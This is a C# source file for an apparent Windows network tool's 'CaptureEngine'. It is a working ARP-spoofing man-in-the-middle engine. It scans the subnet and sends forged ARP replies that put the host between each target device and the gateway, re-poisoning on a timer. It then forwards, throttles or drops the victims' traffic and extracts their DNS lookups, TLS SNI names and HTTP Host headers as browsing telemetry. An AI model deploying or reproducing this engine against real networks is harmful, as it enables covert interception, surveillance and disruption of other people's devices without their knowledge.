using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using FishyNet.Core.Native;
using FishyNet.Core.Packets;

namespace FishyNet.Core;

public readonly record struct PacketFlowObservation(
    ProtocolKind Protocol,
    byte TransportProtocol,
    Ipv4Address LocalIp,
    Ipv4Address RemoteIp,
    ushort LocalPort,
    ushort RemotePort,
    int ByteCount,
    bool IsOutbound,
    bool IsLocalHost,
    Ipv4Address DeviceIp,
    MacAddress DeviceMac);

public interface IPacketTelemetryObserver
{
    void OnPacketFlow(in PacketFlowObservation flow);
    void OnTlsSniObserved(in PacketFlowObservation flow, string serverName);
    void OnHttpHostObserved(in PacketFlowObservation flow, string host);
    void OnDnsMappingsObserved(in PacketFlowObservation flow, ReadOnlySpan<DnsIpMapping> mappings);
}

public sealed record NetworkAdapterInfo(
    string Id,
    string Name,
    string Description,
    NetworkInterfaceType InterfaceType,
    Ipv4Address LocalIp,
    Ipv4Address SubnetMask,
    Ipv4Address GatewayIp,
    MacAddress LocalMac,
    bool IsIpv4ForwardingEnabled);

/// <summary>
/// High-performance, zero-allocation packet capture, ARP spoofing, and Token-Bucket traffic redirection engine.
/// Directly wraps native wpcap.dll (Npcap) handles using Span&lt;byte&gt; over kernel ring buffers.
/// </summary>
public sealed class CaptureEngine : IDisposable
{
    private readonly DeviceRegistry _registry;
    private NetworkAdapterInfo? _adapter;

    private nint _arpHandle;
    private nint _ipHandle;
    private readonly object _handleLock = new();
    private readonly object _observerLock = new();

    private volatile IPacketTelemetryObserver[] _telemetryObservers = [];

    [ThreadStatic]
    private static DnsIpMapping[]? t_dnsMappingScratch;

    private CancellationTokenSource? _arpListenerCts;
    private CancellationTokenSource? _ipCaptureCts;
    private CancellationTokenSource? _spoofCts;
    private CancellationTokenSource? _scanCts;

    private Task? _arpListenerTask;
    private Task? _ipCaptureTask;
    private Task? _spoofLoopTask;

    private volatile bool _isPassiveMonitoring;
    private volatile bool _isRedirecting;
    private volatile bool _isScanning;
    private bool _disposed;

    public DeviceRegistry Registry => _registry;
    public NetworkAdapterInfo? ActiveAdapter => _adapter;
    public bool IsPassiveMonitoring => _isPassiveMonitoring;
    public bool IsRedirecting => _isRedirecting;
    public bool IsScanning => _isScanning;

    public event Action<string>? StatusLog;

    public CaptureEngine(DeviceRegistry registry)
    {
        _registry = registry;
    }

    public void RegisterTelemetryObserver(IPacketTelemetryObserver observer)
    {
        ArgumentNullException.ThrowIfNull(observer);
        lock (_observerLock)
        {
            IPacketTelemetryObserver[] current = _telemetryObservers;
            for (int i = 0; i < current.Length; i++)
            {
                if (ReferenceEquals(current[i], observer))
                {
                    return;
                }
            }

            var next = new IPacketTelemetryObserver[current.Length + 1];
            Array.Copy(current, next, current.Length);
            next[current.Length] = observer;
            _telemetryObservers = next;
        }
    }

    public void UnregisterTelemetryObserver(IPacketTelemetryObserver observer)
    {
        if (observer is null) return;
        lock (_observerLock)
        {
            IPacketTelemetryObserver[] current = _telemetryObservers;
            int idx = Array.IndexOf(current, observer);
            if (idx < 0) return;

            if (current.Length == 1)
            {
                _telemetryObservers = [];
                return;
            }

            var next = new IPacketTelemetryObserver[current.Length - 1];
            if (idx > 0) Array.Copy(current, 0, next, 0, idx);
            if (idx < current.Length - 1) Array.Copy(current, idx + 1, next, idx, current.Length - idx - 1);
            _telemetryObservers = next;
        }
    }

    public static IReadOnlyList<NetworkAdapterInfo> DiscoverSuitableAdapters()
    {
        var list = new List<NetworkAdapterInfo>();
        try
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus != OperationalStatus.Up ||
                    nic.NetworkInterfaceType == NetworkInterfaceType.Loopback ||
                    nic.NetworkInterfaceType == NetworkInterfaceType.Tunnel)
                {
                    continue;
                }

                IPInterfaceProperties ipProps = nic.GetIPProperties();
                Ipv4Address localIp = Ipv4Address.Zero;
                Ipv4Address mask = Ipv4Address.Zero;

                foreach (UnicastIPAddressInformation unicast in ipProps.UnicastAddresses)
                {
                    if (unicast.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        localIp = Ipv4Address.FromIPAddress(unicast.Address);
                        if (unicast.IPv4Mask != null)
                        {
                            mask = Ipv4Address.FromIPAddress(unicast.IPv4Mask);
                        }
                        break;
                    }
                }

                if (localIp.IsZero)
                {
                    continue;
                }

                Ipv4Address gatewayIp = Ipv4Address.Zero;
                foreach (GatewayIPAddressInformation gw in ipProps.GatewayAddresses)
                {
                    if (gw.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        var candidate = Ipv4Address.FromIPAddress(gw.Address);
                        if (!candidate.IsZero)
                        {
                            gatewayIp = candidate;
                            break;
                        }
                    }
                }

                if (gatewayIp.IsZero)
                {
                    continue;
                }

                MacAddress localMac = MacAddress.FromPhysicalAddress(nic.GetPhysicalAddress());
                if (localMac.IsZero)
                {
                    continue;
                }

                bool forwarding = false;
                try
                {
                    forwarding = ipProps.GetIPv4Properties()?.IsForwardingEnabled ?? false;
                }
                catch
                {
                    // Ignore if unsupported on virtual interface
                }

                list.Add(new NetworkAdapterInfo(
                    nic.Id,
                    nic.Name,
                    nic.Description,
                    nic.NetworkInterfaceType,
                    localIp,
                    mask.IsZero ? new Ipv4Address(0xFFFFFF00u) : mask,
                    gatewayIp,
                    localMac,
                    forwarding));
            }
        }
        catch (Exception ex)
        {
            Debug.WriteLine($"Error enumerating NICs: {ex.Message}");
        }

        return list;
    }

    public bool BindAdapter(NetworkAdapterInfo adapter, out string? error)
    {
        StopAll();

        _adapter = adapter;
        _registry.Clear();
        _registry.ConfigureLocalNetwork(adapter.LocalIp, adapter.LocalMac, adapter.GatewayIp);

        lock (_handleLock)
        {
            _arpHandle = WpcapNative.OpenLiveDevice(adapter.Id, 65535, 1, 5, out error);
            if (_arpHandle == nint.Zero)
            {
                return false;
            }

            WpcapNative.SetBpfFilter(_arpHandle, "arp");
        }

        _arpListenerCts = new CancellationTokenSource();
        _arpListenerTask = Task.Factory.StartNew(
            () => RunArpListenerLoop(_arpListenerCts.Token),
            _arpListenerCts.Token,
            TaskCreationOptions.LongRunning,
            TaskScheduler.Default);

        // Immediately probe the router MAC
        SendArpWhoHas(adapter.GatewayIp);

        // Start always-on passive telemetry monitoring on the bound adapter
        if (!StartPassiveMonitor(out string? passiveErr) && !string.IsNullOrWhiteSpace(passiveErr))
        {
            StatusLog?.Invoke($"Passive app/web monitor inactive: {passiveErr}");
        }

        StatusLog?.Invoke($"Bound to {adapter.Description} ({adapter.LocalIp}, GW {adapter.GatewayIp})");
        return true;
    }

    public bool StartPassiveMonitor(out string? error)
    {
        error = null;
        if (_adapter is null)
        {
            error = "No network adapter selected.";
            return false;
        }

        if (_isPassiveMonitoring && _ipHandle != nint.Zero)
        {
            return true;
        }

        if (!EnsureIpCaptureRunning(out error))
        {
            return false;
        }

        _isPassiveMonitoring = true;
        StatusLog?.Invoke("Passive app & website telemetry monitor active.");
        return true;
    }

    public void StopPassiveMonitor()
    {
        if (!_isPassiveMonitoring) return;
        _isPassiveMonitoring = false;

        if (!_isRedirecting)
        {
            StopIpCaptureLoop();
        }
    }

    public void SendArpWhoHas(Ipv4Address targetIp)
    {
        if (_adapter is null || targetIp.IsZero) return;

        Span<byte> frame = stackalloc byte[PacketPrimitives.ArpFrameLength];
        PacketPrimitives.WriteArpPacket(
            frame,
            MacAddress.Broadcast,
            _adapter.LocalMac,
            PacketPrimitives.ArpOpRequest,
            _adapter.LocalMac,
            _adapter.LocalIp,
            MacAddress.Broadcast,
            targetIp);

        lock (_handleLock)
        {
            if (_arpHandle != nint.Zero)
            {
                WpcapNative.SendPacket(_arpHandle, frame);
            }
        }
    }

    public async Task StartSubnetScanAsync()
    {
        if (_adapter is null || _isScanning) return;

        _isScanning = true;
        _scanCts?.Cancel();
        _scanCts = new CancellationTokenSource();
        CancellationToken ct = _scanCts.Token;

        StatusLog?.Invoke($"Scanning subnet {_adapter.LocalIp} / {_adapter.SubnetMask}...");

        try
        {
            await Task.Run(async () =>
            {
                SendArpWhoHas(_adapter.GatewayIp);

                int count = 0;
                foreach (Ipv4Address hostIp in Ipv4Address.EnumerateSubnetHosts(_adapter.LocalIp, _adapter.SubnetMask))
                {
                    if (ct.IsCancellationRequested) break;
                    SendArpWhoHas(hostIp);
                    count++;
                    if (count % 8 == 0)
                    {
                        await Task.Delay(4, ct).ConfigureAwait(false);
                    }
                }
            }, ct).ConfigureAwait(false);

            StatusLog?.Invoke($"Subnet scan completed ({_registry.Count} active hosts).");
        }
        catch (OperationCanceledException)
        {
            // Cancelled
        }
        finally
        {
            _isScanning = false;
        }
    }

    public bool StartRedirection(out string? error)
    {
        error = null;
        if (_adapter is null)
        {
            error = "No network adapter selected.";
            return false;
        }

        if (_isRedirecting)
        {
            return true;
        }

        NetworkDevice? gw = _registry.GetGatewayDevice();
        if (gw is null || gw.Mac.IsZero)
        {
            SendArpWhoHas(_adapter.GatewayIp);
        }

        if (!EnsureIpCaptureRunning(out error))
        {
            return false;
        }

        _isRedirecting = true;
        _spoofCts?.Cancel();
        _spoofCts?.Dispose();
        _spoofCts = new CancellationTokenSource();
        CancellationToken spoofToken = _spoofCts.Token;

        _spoofLoopTask = Task.Run(() => RunPeriodicSpoofLoopAsync(spoofToken), spoofToken);

        StatusLog?.Invoke("Active packet redirection & Token-Bucket shaping started.");
        return true;
    }

    public void StopRedirection()
    {
        if (!_isRedirecting) return;

        _isRedirecting = false;
        try
        {
            _spoofCts?.Cancel();
            _spoofLoopTask?.Wait(TimeSpan.FromMilliseconds(300));
        }
        catch
        {
            // Ignore cancellation exceptions
        }

        CompleteUnspoof();

        if (!_isPassiveMonitoring)
        {
            StopIpCaptureLoop();
        }

        StatusLog?.Invoke("Packet redirection stopped and ARP tables restored.");
    }

    private bool EnsureIpCaptureRunning(out string? error)
    {
        error = null;
        if (_adapter is null)
        {
            error = "No network adapter selected.";
            return false;
        }

        lock (_handleLock)
        {
            if (_ipHandle == nint.Zero)
            {
                _ipHandle = WpcapNative.OpenLiveDevice(_adapter.Id, 65535, 1, 1, out error);
                if (_ipHandle == nint.Zero)
                {
                    return false;
                }

                if (!WpcapNative.SetBpfFilter(_ipHandle, "ip"))
                {
                    error = "Failed to compile BPF 'ip' filter on adapter.";
                    WpcapNative.pcap_close(_ipHandle);
                    _ipHandle = nint.Zero;
                    return false;
                }
            }
        }

        if (_ipCaptureTask is null || _ipCaptureTask.IsCompleted)
        {
            _ipCaptureCts?.Dispose();
            _ipCaptureCts = new CancellationTokenSource();
            CancellationToken token = _ipCaptureCts.Token;

            _ipCaptureTask = Task.Factory.StartNew(
                () => RunIpCaptureLoop(token),
                token,
                TaskCreationOptions.LongRunning,
                TaskScheduler.Default);
        }

        return true;
    }

    private void StopIpCaptureLoop()
    {
        try
        {
            _ipCaptureCts?.Cancel();
            _ipCaptureTask?.Wait(TimeSpan.FromMilliseconds(500));
        }
        catch
        {
            // Ignore cancellation exceptions
        }

        lock (_handleLock)
        {
            if (_ipHandle != nint.Zero)
            {
                WpcapNative.pcap_close(_ipHandle);
                _ipHandle = nint.Zero;
            }
        }
    }

    public void SpoofDevice(NetworkDevice targetDevice)
    {
        if (!_isRedirecting || _adapter is null || targetDevice.IsLocalHost || targetDevice.IsGateway) return;
        NetworkDevice? gatewayDevice = _registry.GetGatewayDevice();
        if (gatewayDevice is null || gatewayDevice.Mac.IsZero) return;
        SpoofDevicePair(targetDevice, gatewayDevice);
    }

    public void SpoofDevicePair(NetworkDevice targetDevice, NetworkDevice gatewayDevice)
    {
        if (_adapter is null || targetDevice.IsLocalHost || targetDevice.IsGateway) return;

        MacAddress localMac = _adapter.LocalMac;
        Ipv4Address localIp = _adapter.LocalIp;
        Span<byte> frame = stackalloc byte[PacketPrimitives.ArpFrameLength];

        lock (_handleLock)
        {
            if (_arpHandle == nint.Zero) return;

            // 1. Tell target device that Gateway IP is at our LocalMac
            PacketPrimitives.WriteArpPacket(
                frame,
                targetDevice.Mac,
                localMac,
                PacketPrimitives.ArpOpReply,
                localMac,
                gatewayDevice.Ip,
                targetDevice.Mac,
                targetDevice.Ip);
            WpcapNative.SendPacket(_arpHandle, frame);

            // 2. Tell Gateway that Target IP is at our LocalMac
            PacketPrimitives.WriteArpPacket(
                frame,
                gatewayDevice.Mac,
                localMac,
                PacketPrimitives.ArpOpReply,
                localMac,
                targetDevice.Ip,
                gatewayDevice.Mac,
                gatewayDevice.Ip);
            WpcapNative.SendPacket(_arpHandle, frame);

            // 3. Keep our own local ARP cache clean
            PacketPrimitives.WriteArpPacket(
                frame,
                localMac,
                gatewayDevice.Mac,
                PacketPrimitives.ArpOpReply,
                gatewayDevice.Mac,
                gatewayDevice.Ip,
                localMac,
                localIp);
            WpcapNative.SendPacket(_arpHandle, frame);
        }
    }

    public void UnspoofDevice(NetworkDevice targetDevice, int burstCount = 5)
    {
        if (_adapter is null || targetDevice.IsLocalHost || targetDevice.IsGateway) return;
        NetworkDevice? gatewayDevice = _registry.GetGatewayDevice();
        if (gatewayDevice is null || gatewayDevice.Mac.IsZero) return;

        Span<byte> frame = stackalloc byte[PacketPrimitives.ArpFrameLength];

        lock (_handleLock)
        {
            if (_arpHandle == nint.Zero) return;

            for (int i = 0; i < burstCount; i++)
            {
                // Restore real Gateway MAC on target device
                PacketPrimitives.WriteArpPacket(
                    frame,
                    targetDevice.Mac,
                    gatewayDevice.Mac,
                    PacketPrimitives.ArpOpReply,
                    gatewayDevice.Mac,
                    gatewayDevice.Ip,
                    targetDevice.Mac,
                    targetDevice.Ip);
                WpcapNative.SendPacket(_arpHandle, frame);

                // Restore real Target MAC on Gateway
                PacketPrimitives.WriteArpPacket(
                    frame,
                    gatewayDevice.Mac,
                    targetDevice.Mac,
                    PacketPrimitives.ArpOpReply,
                    targetDevice.Mac,
                    targetDevice.Ip,
                    gatewayDevice.Mac,
                    gatewayDevice.Ip);
                WpcapNative.SendPacket(_arpHandle, frame);
            }
        }
    }

    public void CompleteUnspoof()
    {
        NetworkDevice? gw = _registry.GetGatewayDevice();
        if (gw is null) return;

        foreach (NetworkDevice device in _registry.AllDevices)
        {
            if (!device.IsGateway && !device.IsLocalHost)
            {
                UnspoofDevice(device, burstCount: 3);
            }
        }
    }

    private unsafe void RunArpListenerLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            nint handle = _arpHandle;
            if (handle == nint.Zero) break;

            int res = WpcapNative.pcap_next_ex(handle, out WpcapNative.PcapPkthdr* hdr, out byte* data);
            if (res <= 0 || hdr == null || data == null)
            {
                continue;
            }

            int capLen = (int)hdr->CapLen;
            if (capLen < PacketPrimitives.ArpFrameLength)
            {
                continue;
            }

            var frame = new ReadOnlySpan<byte>(data, capLen);
            if (!PacketPrimitives.TryParseArp(
                frame,
                out MacAddress ethSrcMac,
                out ushort op,
                out MacAddress senderMac,
                out Ipv4Address senderIp,
                out _,
                out _))
            {
                continue;
            }

            if (_adapter is not null && (ethSrcMac == _adapter.LocalMac || senderMac == _adapter.LocalMac))
            {
                continue;
            }

            if ((op == PacketPrimitives.ArpOpReply || op == PacketPrimitives.ArpOpRequest) &&
                !senderIp.IsZero &&
                !senderMac.IsZero &&
                !senderMac.IsBroadcast)
            {
                _registry.RegisterOrUpdateDevice(senderIp, senderMac);
            }
        }
    }

    private unsafe void RunIpCaptureLoop(CancellationToken ct)
    {
        if (_adapter is null) return;
        NetworkAdapterInfo adapter = _adapter;

        while (!ct.IsCancellationRequested)
        {
            nint handle = _ipHandle;
            if (handle == nint.Zero) break;

            int res = WpcapNative.pcap_next_ex(handle, out WpcapNative.PcapPkthdr* hdr, out byte* data);
            if (res <= 0 || hdr == null || data == null)
            {
                continue;
            }

            int capLen = (int)hdr->CapLen;
            if (capLen < 34)
            {
                continue;
            }

            var frame = new Span<byte>(data, capLen);
            ProcessObservedIpv4Frame(frame, capLen, adapter, handle, allowForwarding: _isRedirecting);
        }
    }

    internal unsafe void ProcessObservedIpv4Frame(
        Span<byte> frame,
        int capLen,
        NetworkAdapterInfo adapter,
        nint activeHandle,
        bool allowForwarding)
    {
        if (!PacketPrimitives.TryInspectIpv4Packet(
            frame,
            out _,
            out MacAddress ethSrc,
            out Ipv4Address ipSrc,
            out Ipv4Address ipDest,
            out ProtocolKind protocol,
            out byte ipProto,
            out ushort srcPort,
            out ushort dstPort,
            out int l4PayloadOffset,
            out int ipPacketEndOffset))
        {
            return;
        }

        MacAddress localMac = adapter.LocalMac;
        Ipv4Address localIp = adapter.LocalIp;

        // 1. Outbound traffic originating from our own Local PC
        if (ethSrc == localMac)
        {
            if (ipSrc == localIp)
            {
                _registry.GetLocalDevice()?.RecordSentPacket(capLen, protocol);

                if (_telemetryObservers.Length > 0)
                {
                    var flow = new PacketFlowObservation(
                        protocol,
                        ipProto,
                        ipSrc,
                        ipDest,
                        srcPort,
                        dstPort,
                        capLen,
                        IsOutbound: true,
                        IsLocalHost: true,
                        ipSrc,
                        localMac);
                    DispatchPacketTelemetry(frame, l4PayloadOffset, ipPacketEndOffset, in flow);
                }
            }
            return;
        }

        // 2. Inbound traffic destined to our own Local PC (works passively without ARP spoofing)
        if (ipDest == localIp)
        {
            _registry.GetLocalDevice()?.RecordReceivedPacket(capLen, protocol);

            if (_telemetryObservers.Length > 0)
            {
                var flow = new PacketFlowObservation(
                    protocol,
                    ipProto,
                    ipDest,
                    ipSrc,
                    dstPort,
                    srcPort,
                    capLen,
                    IsOutbound: false,
                    IsLocalHost: true,
                    ipDest,
                    localMac);
                DispatchPacketTelemetry(frame, l4PayloadOffset, ipPacketEndOffset, in flow);
            }
            return;
        }

        if (!allowForwarding)
        {
            return;
        }

        MacAddress routerMac = _registry.GatewayMac;
        long nowTimestamp = Stopwatch.GetTimestamp();

        // 3. Inbound traffic from Gateway -> Spoofed LAN Device (Download)
        if (!routerMac.IsZero && ethSrc == routerMac)
        {
            NetworkDevice? targetDevice = _registry.TryGetByIp(ipDest);
            if (targetDevice is not null && !targetDevice.IsLocalHost && !targetDevice.IsGateway)
            {
                targetDevice.TouchLastSeen();
                if (!targetDevice.IsSpoofed)
                {
                    return;
                }

                if (targetDevice.TryAllowDownloadPacket(capLen, nowTimestamp))
                {
                    if (_telemetryObservers.Length > 0)
                    {
                        var flow = new PacketFlowObservation(
                            protocol,
                            ipProto,
                            ipDest,
                            ipSrc,
                            dstPort,
                            srcPort,
                            capLen,
                            IsOutbound: false,
                            IsLocalHost: false,
                            targetDevice.Ip,
                            targetDevice.Mac);
                        DispatchPacketTelemetry(frame, l4PayloadOffset, ipPacketEndOffset, in flow);
                    }

                    PacketPrimitives.RewriteEthernetHeaderInPlace(frame, targetDevice.Mac, localMac);
                    if (activeHandle != nint.Zero)
                    {
                        fixed (byte* ptr = frame)
                        {
                            WpcapNative.pcap_sendpacket(activeHandle, ptr, capLen);
                        }
                    }
                    targetDevice.RecordReceivedPacket(capLen, protocol);
                }
            }
            return;
        }

        // 4. Outbound traffic from Spoofed LAN Device -> Gateway (Upload)
        NetworkDevice? sourceDevice = _registry.TryGetByMac(ethSrc) ?? _registry.TryGetByIp(ipSrc);
        if (sourceDevice is not null && !sourceDevice.IsLocalHost && !sourceDevice.IsGateway)
        {
            sourceDevice.TouchLastSeen();

            // Inspect outbound DNS queries (UDP port 53 / 5353)
            if (protocol == ProtocolKind.Dns && (dstPort == 53 || dstPort == 5353))
            {
                sourceDevice.RecordDnsQuery();
                if (PacketPrimitives.TryExtractDnsQueryDomain(frame, l4PayloadOffset, out string domain))
                {
                    bool domainBlocked = sourceDevice.IsBlocked || sourceDevice.IsDomainBlocked(domain);
                    _registry.PublishDnsQuery(sourceDevice, domain, domainBlocked);
                    if (domainBlocked)
                    {
                        sourceDevice.RecordDroppedPacket();
                        return;
                    }
                }
            }

            if (!sourceDevice.IsSpoofed || routerMac.IsZero)
            {
                return;
            }

            if (sourceDevice.TryAllowUploadPacket(capLen, nowTimestamp))
            {
                if (_telemetryObservers.Length > 0)
                {
                    var flow = new PacketFlowObservation(
                        protocol,
                        ipProto,
                        ipSrc,
                        ipDest,
                        srcPort,
                        dstPort,
                        capLen,
                        IsOutbound: true,
                        IsLocalHost: false,
                        sourceDevice.Ip,
                        sourceDevice.Mac);
                    DispatchPacketTelemetry(frame, l4PayloadOffset, ipPacketEndOffset, in flow);
                }

                PacketPrimitives.RewriteEthernetHeaderInPlace(frame, routerMac, localMac);
                if (activeHandle != nint.Zero)
                {
                    fixed (byte* ptr = frame)
                    {
                        WpcapNative.pcap_sendpacket(activeHandle, ptr, capLen);
                    }
                }
                sourceDevice.RecordSentPacket(capLen, protocol);
            }
        }
    }

    private void DispatchPacketTelemetry(
        ReadOnlySpan<byte> frame,
        int l4PayloadOffset,
        int ipPacketEndOffset,
        in PacketFlowObservation flow)
    {
        IPacketTelemetryObserver[] observers = _telemetryObservers;
        if (observers.Length == 0)
        {
            return;
        }

        ReadOnlySpan<byte> l4Payload = l4PayloadOffset >= 0 && l4PayloadOffset < ipPacketEndOffset && ipPacketEndOffset <= frame.Length
            ? frame.Slice(l4PayloadOffset, ipPacketEndOffset - l4PayloadOffset)
            : ReadOnlySpan<byte>.Empty;

        // 1. DNS A / AAAA response mappings (UDP src port 53 or 5353)
        if (flow.TransportProtocol == 17 && !flow.IsOutbound && (flow.RemotePort == 53 || flow.RemotePort == 5353) && l4Payload.Length >= 12)
        {
            DnsIpMapping[] scratch = t_dnsMappingScratch ??= new DnsIpMapping[16];
            if (PacketPrimitives.TryExtractDnsResponseMappings(l4Payload, scratch, out int count))
            {
                ReadOnlySpan<DnsIpMapping> mappings = scratch.AsSpan(0, count);
                for (int i = 0; i < observers.Length; i++)
                {
                    observers[i].OnDnsMappingsObserved(in flow, mappings);
                }
                Array.Clear(scratch, 0, count);
            }
        }
        // 2. TLS ClientHello SNI (outbound TCP starting with Handshake 0x16 0x03)
        else if (flow.TransportProtocol == 6 && flow.IsOutbound && l4Payload.Length >= 43 && l4Payload[0] == 0x16 && l4Payload[1] == 0x03)
        {
            if (PacketPrimitives.TryExtractTlsClientHelloSni(l4Payload, out string sni))
            {
                for (int i = 0; i < observers.Length; i++)
                {
                    observers[i].OnTlsSniObserved(in flow, sni);
                }
            }
        }
        // 3. Plaintext HTTP Host header (outbound TCP)
        else if (flow.TransportProtocol == 6 && flow.IsOutbound && l4Payload.Length >= 16 && IsLikelyHttpFirstByte(l4Payload[0]))
        {
            if (PacketPrimitives.TryExtractHttpHost(l4Payload, out string host))
            {
                for (int i = 0; i < observers.Length; i++)
                {
                    observers[i].OnHttpHostObserved(in flow, host);
                }
            }
        }

        for (int i = 0; i < observers.Length; i++)
        {
            observers[i].OnPacketFlow(in flow);
        }
    }

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    private static bool IsLikelyHttpFirstByte(byte b) =>
        b is (byte)'G' or (byte)'P' or (byte)'H' or (byte)'D' or (byte)'O' or (byte)'C' or (byte)'T';

    private async Task RunPeriodicSpoofLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested && _isRedirecting)
        {
            try
            {
                NetworkDevice? gw = _registry.GetGatewayDevice();
                if (gw is null && _adapter is not null)
                {
                    SendArpWhoHas(_adapter.GatewayIp);
                }
                else if (gw is not null)
                {
                    foreach (NetworkDevice device in _registry.AllDevices)
                    {
                        if (ct.IsCancellationRequested) break;
                        if (device.IsSpoofed && !device.IsGateway && !device.IsLocalHost)
                        {
                            SpoofDevicePair(device, gw);
                        }
                    }
                }

                await Task.Delay(2500, ct).ConfigureAwait(false);
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Spoof loop warning: {ex.Message}");
            }
        }
    }

    public void StopCapture() => StopAll();

    public void StopAll()
    {
        _isPassiveMonitoring = false;
        StopRedirection();
        StopIpCaptureLoop();

        try
        {
            _scanCts?.Cancel();
            _arpListenerCts?.Cancel();
            _arpListenerTask?.Wait(TimeSpan.FromMilliseconds(300));
        }
        catch
        {
            // Ignore
        }

        lock (_handleLock)
        {
            if (_arpHandle != nint.Zero)
            {
                WpcapNative.pcap_close(_arpHandle);
                _arpHandle = nint.Zero;
            }
        }
    }

    public void Dispose()
    {
        if (_disposed) return;
        _disposed = true;
        StopAll();
    }
}
